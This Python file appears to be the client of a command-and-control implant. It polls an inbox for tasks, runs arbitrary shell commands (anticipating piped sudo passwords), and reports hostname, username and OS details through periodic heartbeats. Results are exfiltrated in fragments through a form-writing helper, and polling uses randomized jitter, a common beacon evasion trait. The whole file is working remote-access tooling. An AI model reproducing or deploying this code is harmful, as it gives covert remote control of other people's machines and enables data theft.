import getpass
import json
import os
import platform
import random
import subprocess
import time
import uuid
from datetime import datetime, timezone

import common

# How many poll cycles between heartbeats
HEARTBEAT_EVERY = 10

# Persistent config file (written by handle_config, loaded on startup)
_CONFIG_FILE = ".client_config.json"

# Fragment send queue — persisted across cycles, one fragment sent per poll
_SEND_QUEUE_FILE = ".fragment_send_queue.json"
_send_queue = []  # list of outbox fragment row dicts

# Known config keys and their defaults
_KNOWN_CONFIG_KEYS = {"poll_interval_sec", "poll_jitter_min", "poll_jitter_max", "client_id"}

_client_config = {
    "poll_interval_sec": "30",
    "poll_jitter_min": "5",
    "poll_jitter_max": "15",
    "client_id": os.environ.get("CLIENT_ID", "worker-01"),
}


def _load_client_config():
    """Load persisted config from disk into _client_config (only known keys)."""
    if not os.path.exists(_CONFIG_FILE):
        return
    try:
        with open(_CONFIG_FILE) as f:
            saved = json.load(f)
        for k, v in saved.items():
            if k in _KNOWN_CONFIG_KEYS:
                _client_config[k] = v
        print(f"[client] Loaded config from {_CONFIG_FILE}")
    except Exception as e:
        print(f"[warn] Failed to load {_CONFIG_FILE}: {e}")


def _save_client_config():
    """Persist current _client_config to disk."""
    try:
        with open(_CONFIG_FILE, "w") as f:
            json.dump(_client_config, f, indent=2)
    except Exception as e:
        print(f"[warn] Failed to save {_CONFIG_FILE}: {e}")


def _load_send_queue():
    """Load persisted fragment send queue from disk."""
    global _send_queue
    if not os.path.exists(_SEND_QUEUE_FILE):
        return
    try:
        with open(_SEND_QUEUE_FILE) as f:
            _send_queue = json.load(f)
        if _send_queue:
            print(f"[client] Resumed send queue: {len(_send_queue)} fragment(s) pending")
    except Exception as e:
        print(f"[warn] Failed to load {_SEND_QUEUE_FILE}: {e}")
        _send_queue = []


def _save_send_queue():
    """Persist current send queue to disk."""
    try:
        with open(_SEND_QUEUE_FILE, "w") as f:
            json.dump(_send_queue, f)
    except Exception as e:
        print(f"[warn] Failed to save {_SEND_QUEUE_FILE}: {e}")


def _get_username():
    try:
        return getpass.getuser()
    except Exception:
        return "unknown"


def _system_info():
    return {
        "os": platform.system(),
        "os_version": platform.version(),
        "hostname": platform.node(),
        "python_version": platform.python_version(),
        "architecture": platform.machine(),
        "username": _get_username(),
    }


# ---------------------------------------------------------------------------
# Handlers
# ---------------------------------------------------------------------------

def handle_system_info(payload):
    return _system_info()


def handle_echo(payload):
    return payload


def handle_shell(payload):
    cmd = payload.get("cmd", "")
    if not cmd:
        return {"error": "no cmd provided"}

    stdin_data = payload.get("stdin")
    # Safety: if cmd uses sudo -S (reads password from stdin), ignore the stdin field to avoid conflict
    if stdin_data is not None and "| sudo -S" in cmd:
        print("[client] Warning: ignoring stdin field because cmd already contains piped input")
        stdin_data = None

    try:
        if stdin_data is not None:
            proc = subprocess.run(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                input=stdin_data.encode(),
                timeout=30,
            )
        else:
            proc = subprocess.run(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                timeout=30,
            )
        return {
            "stdout": proc.stdout.decode(errors="replace"),
            "stderr": proc.stderr.decode(errors="replace"),
            "returncode": proc.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"error": "command timed out after 30s"}
    except Exception as e:
        return {"error": str(e)}


def handle_config(payload):
    """Update client config with only known keys. Persists changes to disk."""
    updated = {}
    ignored = {}
    for k, v in payload.items():
        if k in _KNOWN_CONFIG_KEYS:
            _client_config[k] = str(v)
            updated[k] = str(v)
        else:
            ignored[k] = v
    if updated:
        _save_client_config()
        print(f"[client] Config updated: {updated}")
    if ignored:
        print(f"[client] Ignored unknown config keys: {list(ignored.keys())}")
    result = {"updated": updated, "current": dict(_client_config)}
    if ignored:
        result["ignored"] = ignored
    return result


HANDLERS = {
    "system_info": handle_system_info,
    "echo": handle_echo,
    "shell": handle_shell,
    "config": handle_config,
}


# ---------------------------------------------------------------------------
# Dispatch
# ---------------------------------------------------------------------------

def dispatch(task):
    command = task.get("command", "")
    try:
        payload = json.loads(task.get("payload") or "{}")
    except json.JSONDecodeError:
        payload = {}

    handler = HANDLERS.get(command)
    if handler is None:
        result_data = {"error": f"unknown command: {command}"}
        status = "error"
    else:
        try:
            result_data = handler(payload)
            status = "success"
        except Exception as e:
            result_data = {"error": str(e)}
            status = "error"

    client_id = _client_config.get("client_id", _get_username())
    result_str = json.dumps(result_data)
    data = {
        "command_id": task["command_id"],
        "client_id": client_id,
        "status": status,
        "result": result_str,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    # Fragment large results — write first chunk now, queue the rest
    fragmenter = common.get_fragmenter()
    chunks = fragmenter.fragment(result_str)
    if len(chunks) > 1:
        frags = common.build_outbox_fragments(data, chunks)
        data["_fragments"] = frags  # carry fragments for main loop to handle

    return data


def send_heartbeat():
    result = {
        "command_id": f"heartbeat-{uuid.uuid4()}",
        "client_id": _client_config.get("client_id", "unknown"),
        "status": "heartbeat",
        "result": json.dumps(_system_info()),
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    ok = common.write_form(result)
    if not ok:
        print("[warn] heartbeat write failed")
    else:
        print("[client] Heartbeat sent")


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

def main():
    common.load_env()
    _load_client_config()
    _load_send_queue()

    processed = set()
    cycle = 0

    print("[info] client starting")

    while True:
        # Send heartbeat on startup and every N cycles
        if cycle == 0 or cycle % HEARTBEAT_EVERY == 0:
            send_heartbeat()

        # Read outbox to rebuild processed set on first cycle
        try:
            outbox = common.read_outbox()
            if not processed:
                processed = {r["command_id"] for r in outbox if "command_id" in r}
                print(f"[info] initialized processed set with {len(processed)} known command(s)")
        except Exception as e:
            print(f"[warn] outbox read failed: {e}")

        # Read inbox
        try:
            inbox = common.read_inbox()
        except Exception as e:
            print(f"[warn] inbox read failed, skipping cycle: {e}")
            inbox = []

        pending = [
            t for t in inbox
            if t.get("status") == "pending" and t.get("command_id") not in processed
        ]

        # Flush one queued fragment before processing new commands
        if _send_queue:
            frag = _send_queue[0]
            ok = common.write_form(frag)
            if ok:
                _send_queue.pop(0)
                _save_send_queue()
                remaining = len(_send_queue)
                print(f"[client] Fragment sent for {frag['command_id']} "
                      f"({frag['status']}) — {remaining} remaining in queue")
            else:
                print(f"[warn] Fragment write failed for {frag['command_id']}, will retry next cycle")

        if pending:
            print(f"[info] {len(pending)} pending command(s)")

        for task in pending:
            tid = task.get("command_id", "?")
            print(f"[info] executing command {tid} ({task.get('command')})")
            result = dispatch(task)
            frags = result.pop("_fragments", None)

            if frags:
                # Send first fragment now; queue the rest for subsequent cycles
                ok = common.write_form(frags[0])
                if ok:
                    processed.add(tid)
                    if len(frags) > 1:
                        _send_queue.extend(frags[1:])
                        _save_send_queue()
                        print(f"[info] command {tid}: fragment 0/{len(frags)-1} sent, "
                              f"{len(frags)-1} queued")
                    else:
                        print(f"[info] command {tid} done (single fragment)")
                else:
                    print(f"[error] command {tid} fragment 0 write failed, will retry next cycle")
            else:
                ok = common.write_form(result)
                if ok:
                    processed.add(tid)
                    print(f"[info] command {tid} done, result written")
                else:
                    print(f"[error] command {tid} result write failed, will retry next cycle")

        # Sleep using current _client_config (may have been updated by a config command)
        try:
            interval = float(_client_config.get("poll_interval_sec", 30))
            jitter_min = float(_client_config.get("poll_jitter_min", 5))
            jitter_max = float(_client_config.get("poll_jitter_max", 15))
        except ValueError:
            interval, jitter_min, jitter_max = 30, 5, 15

        sleep_sec = interval + random.uniform(jitter_min, jitter_max)
        print(f"[info] sleeping {sleep_sec:.1f}s")
        time.sleep(sleep_sec)
        cycle += 1


if __name__ == "__main__":
    main()
